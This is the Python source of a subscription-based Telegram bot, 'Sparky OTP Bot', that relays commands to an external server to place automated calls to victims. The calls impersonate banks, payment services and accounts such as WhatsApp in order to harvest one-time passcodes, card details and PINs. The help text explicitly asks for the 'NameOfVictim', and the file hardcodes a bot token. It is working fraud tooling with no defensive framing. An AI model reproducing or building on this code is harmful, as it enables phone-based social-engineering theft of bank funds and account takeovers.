from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext, CallbackQueryHandler
import requests
from time import sleep

from vonage import verify

url = "https://escobar-otp-grabber.herokuapp.com"

token = "5078799701:AAGtwv7Iar3ZWGTEQR6TLsJudTjBMGPeA_o"

def verify(username):
    with open('users.txt', 'r') as f:
        users = str(f.read()).split()
    if username in users:
        return True
    else:
        return False

def start(update, context):
    update.message.reply_text(f"Hiii {update.message.from_user['username']},\nWelcome to Sparky OTP Bot.")

def bank(update, context):
    if verify(update.message.from_user['username']):    
        msg = str(update.message.text).split()
        try:
            r = requests.get(f"{url}/create-call/bank?bank={msg[2]}&victim={msg[1]}&digits={msg[3]}&atmDigits={msg[4]}&chat_id={update.message.from_user['id']}&name={msg[5]}")
            update.message.reply_text(f"Call Initiated to {msg[1]}")
        except:
            update.message.reply_text(f"Unable to Initiate Call for {msg[1]}")
    else:
        update.message.reply_text(f"Purchase Subscription or Contact @MrSp4rX")
        
def card(update, context):
    if verify(update.message.from_user['username']):
        msg = str(update.message.text).split()
        try:
            r = requests.get(f"{url}/create-call/card?bank={msg[2]}&victim={msg[1]}&card={msg[3]}&chat_id={update.message.from_user['id']}&name={msg[4]}")
            update.message.reply_text(f"Call Initiated to {msg[1]}")
        except:
            update.message.reply_text(f"Unable to Initiate Call for {msg[1]}")
    else:
        update.message.reply_text(f"Purchase Subscription or Contact @MrSp4rX")

def pay(update, context):
    if verify(update.message.from_user['username']):
        msg = str(update.message.text).split()
        try:
            r = requests.get(f"{url}/create-call/pay?bank={msg[2]}&victim={msg[1]}&digits={msg[3]}&atmDigits={msg[4]}&chat_id={update.message.from_user['id']}&name={msg[5]}")
            update.message.reply_text(f"Call Initiated to {msg[1]}")
        except:
            update.message.reply_text(f"Unable to Initiate Call for {msg[1]}")
    else:
        update.message.reply_text(f"Purchase Subscription or Contact @MrSp4rX")


def account(update, context):
    if verify(update.message.from_user['username']):
        msg = str(update.message.text).split()
        try:
            r = requests.get(f"{url}/create-call/account?account={msg[2]}&victim={msg[1]}&digits={msg[4]}&method={msg[3]}&chat_id={update.message.from_user['id']}&name={msg[5]}")
            update.message.reply_text(f"Call Initiated to {msg[1]}")
        except:
            update.message.reply_text(f"Unable to Initiate Call for {msg[1]}")
    else:
        update.message.reply_text(f"Purchase Subscription or Contact @MrSp4rX")


def help(update, context):
    try:
        msg = str(update.message.text).split()
        if msg[1] == "bank":
            update.message.reply_text(f"Method: /bank MobileNumber Bank OTPLenght CardPinLength NameOfVictim\nBank : Ex. Chase, WellsFargo, Citi Bank Etc.\nOTPLength : Ex. 4/5//6/7/8\nCardPinLength : 4/6")
        elif msg[1] == "card":
            update.message.reply_text(f"Method: /card MobileNumber Bank CardType NameOfVictim\nBank : Ex. Chase, WellsFargo, Citi Bank Etc.\nCardType :Ex. Credit/Debit\n")
        elif msg[1] == "pay":
            update.message.reply_text(f"Method: /pay MobileNumber PayType OTPLength CardPinLength NameOfVictim\nPay : Ex. Apple, Google, Samsung Etc.\nOTPLength : Ex. 4/5//6/7/8\nCardPinLength : 4/6")
        elif msg[1] == "account":
            update.message.reply_text(f"Method: /account MobileNumber AccountName Method OTPLength NameOfVictim\nAccountName : Ex. WhatsApp, Facebook, Instagram Etc.\nMethod : Ex. MobileNumber, EmailID, TwitterHandle,GoogleAuthenticator Etc.\nOTPLength : Ex. 4/5//6/7/8")
        else:
            update.message.reply_text(f"Invalid Argument Provided.")
    except:
        update.message.reply_text("Please Provide any argument like card or bank.")

def add(update, context):
    if int(update.message.from_user['id']) == 1951961202:
        msg = str(update.message.text).split()
        with open('users.txt', 'a') as f:
            f.write(msg[1]+"\n")

        update.message.reply_text(f"{msg[1]} Allowed!")
    else:
        update.message.reply_text("Baap ko chodna mt sikha")

def delete(update, context):
    if int(update.message.from_user['id']) == 1951961202:
        msg = str(update.message.text).split()
        with open('users.txt', 'r') as f:
            content = f.read()
            content = content.replace(msg[1], '')
        
        with open('users.txt', 'w') as f:
            f.write(content)
            update.message.reply_text(f"@{msg[1]} Removed Successfully!")
    else:
        update.message.reply_text("Baap ko chodna mt sikha")


def main():
    updater = Updater(token, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("bank", bank))
    dp.add_handler(CommandHandler("card", card))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("pay", pay))
    dp.add_handler(CommandHandler("account", account))
    dp.add_handler(CommandHandler("add", add))
    dp.add_handler(CommandHandler("delete", delete))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
